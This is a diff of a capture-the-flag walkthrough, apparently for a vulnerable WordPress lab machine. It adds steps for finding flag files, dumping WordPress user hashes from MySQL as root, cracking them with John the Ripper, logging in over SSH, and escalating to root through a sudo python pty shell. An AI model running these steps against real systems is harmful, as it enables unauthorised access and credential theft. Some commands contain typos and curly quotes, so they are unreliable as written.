@@ -108,7 +108,7 @@ Getting information about open ports using nmap for all hosts in the range of IP
 
 - `getid`, `getwd`, `sysinfo`, `ifconfig`, or `ls`, `pwd` if there is shell
 
-- At this point we can also search for the files contining the name `find -name flag.txt 2>dev/null`
+- At this point we can also search for the files contining the name `find -name flag.txt 2>dev/null` or `find -type f -iname ‘flag*’`
 
 
 > Accessing the MYSQL database using the root user
@@ -126,3 +126,21 @@ Getting information about open ports using nmap for all hosts in the range of IP
 - This reveals the password for root access to the mysql database
 
 - `mysql -u root -p` to log in to mysql and typing the password
+
+- After gaining access into the MYSQL server further information can be gathered by typing the following commands
+
+- `show databases`
+- `use wordpress`
+- `show tables`
+- `select * from wp_posts`
+- `select * from wp_users`
+
+- With the new information gathered, the hashes of the usernames can be accessed and copied into a text file for use by `John the Ripper`
+
+- `nano michael-steven_hashes.txt`
+
+- Once the passwords have been hacked. I can now login as Steven via SSH 
+
+- `ssh steven@192.168.1.110`
+
+- Then you can attempt to acquire root access with `sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’` and find flag 4
